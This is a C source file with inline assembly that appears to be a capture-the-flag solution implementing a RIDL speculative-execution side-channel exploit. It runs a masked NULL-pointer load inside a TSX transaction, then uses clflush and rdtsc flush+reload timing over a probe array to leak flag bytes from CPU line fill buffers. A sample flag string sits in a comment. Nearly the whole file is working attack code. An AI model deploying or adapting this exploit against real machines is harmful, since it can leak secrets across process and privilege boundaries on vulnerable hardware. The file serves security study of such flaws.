asm(
    "jmp _start                 \n"

    ".global syscall            \n"
    "syscall:                   \n"
    "movq %rdi, %rax            \n"
    "movq %rsi, %rdi            \n"
    "movq %rdx, %rsi            \n"
    "movq %rcx, %rdx            \n"
    "movq %r8, %r10             \n"
    "movq %r9, %r8              \n"
    "movq 8(%rsp),%r9           \n"
    "syscall                    \n"
    "ret                        \n"
   );
#include <linux/sched.h>
#include <netinet/in.h>
#include <syscall.h>
#include <emmintrin.h>
#include <immintrin.h>
#include <unistd.h>

extern "C" {
  void _start(void);
  long int syscall(long int __sysno, ...);
}

#define write(fd, buf, sz)                    syscall(SYS_write, fd, buf, sz)
#define read(fd, buf, sz)                     syscall(SYS_read, fd, buf, sz)
#define exit(code)                            syscall(SYS_exit, code)

void h2a (uint64_t hex, char* buf)
{
  int i;
  for (i = 0; i < 16; i++)
  {
    int src;

    src = (char) ((hex & (0xf000000000000000 >> (i * 4))) >> (15 - i)*4);

    if (src >= 0 && src < 0x0a)
      src += 0x30;

    else if (src >= 0x0a && src < 0x10)
      src += 0x57;

    else
      write (1, "SOMETHING WRONG FUCK", 39);

    buf[i] = (char) src;
  }
}
//void flush(void *p) { _mm_clflush(p);}
void flush(void *p) {asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }
void call_flush (void * probe)
{
  int i;
  for (i = 0; i < 256; i++)
    flush((char*)probe + i * 4096);
}

int *score;
void reload (void * _probe)
{
  char *probe = (char *)_probe;
  uint64_t a, d, tmp, dt, unused;;
  int i;
  int update=0;


  for (i=0; i < 256; i++)
  {
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    tmp = (d << 32) | a;
    asm volatile("mfence");
    unused = *(volatile char *)(probe + 4096 * i);// ((i*0x1337) % 256) *4096);
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    dt = ((d<<32) | a) - tmp; 
    asm volatile("mfence");

    flush(probe + 4096 * i);//((i *0x1337) % 256)*4096);
    asm volatile("mfence");

    if (dt < 170)
    {
      int idx = i;//(i *0x1337) % 256;
      score[idx]+=1;
      update = 1;
      char buf[16];
      h2a(idx, buf);
      write (1, buf, 16);
      write (1, ": ", 2);
      h2a(score[idx], buf);
      write (1, buf, 16);
      write (1, "\n", 1);
    }
  }
}

void ridl (void * probe)
{
  call_flush(probe);
  /* array index for flag leak.
   * if the index is 0x0 and  string aa = "CT\x00\x00\x00";
   * and inline asm index shoulde be fixed according to the index 
   * 'F" will be leaked 
   */
  //char aa[0x30]="CTF{shahgheixur5Ievei6z}\x00\x00\x00\x00\x00\x00\x00\x00";
  //uint64_t mask = *(uint64_t*)&aa[0x16];//0x7b465443;
  char aa[0x30]="CT\x00\x00\x00\x00\x00\x00\x00";
  uint64_t mask = *(uint64_t*)&aa[0];//0x7b465443;
  uint64_t unused;
  volatile uint64_t * mapping = NULL;
  if (_xbegin() == _XBEGIN_STARTED)
  {
    uint64_t *p;
    asm volatile(
        /* 
         *   line fill buffer might have alignment and 'flag' var is on 0x40d0.
         *   So I guess, indexing 0 is equal to indexing 0x40c0
         */ 
        //"movq 0x26(%%rcx), %%rax\n"
        "movq 0x10(%%rcx), %%rax\n"
        "and %%rdx, %%rax\n"
        "subq %%rbx, %%rax\n"
        "rorq $16, %%rax\n"
        "movq %%rax, %0\n"
        : "=r"(p)
        :"b"(mask), "c"(mapping), "d" (0xffffff)
        :);

    asm volatile(
        // check for speculative execution
        //     "mov $0x41, %rax\n"  
        "shl $12, %rax\n"
        "addq %rdi, %rax\n"
        "movb (%rax), %al\n");

    // need to write inline assembly to evade g++ optimization
    //volatile uint64_t p = ((*(volatile uint64_t*)NULL) & 0xffffffffff) ^ mask;
    //unused = *(volatile char *) ((char*)probe + 4096 * ((p>>32) | (p<<32)));
    //unused = *(uint64_t*)((char*)probe + (uint64_t)p * 4096);
    //unused = *(uint64_t*)((char*)probe + (*(volatile char*)NULL) * 4096);
    _xend();
  } else reload (probe);

}
long int syscall(long int __sysno);
void _start(void){
  void * probe;
  int results[256]={0,};
  score = results;

  // given probe is too short. so I just used code area
  probe = (void *)((((uint64_t)_start + 0x40000) & ~0xffff));

  char buf[20];
  h2a((uint64_t)probe, buf);
  write (1, buf, 16);
  write (1, ":0\n", 3);


  call_flush(probe);
  while (1)
    ridl (probe);

  exit(0);
}

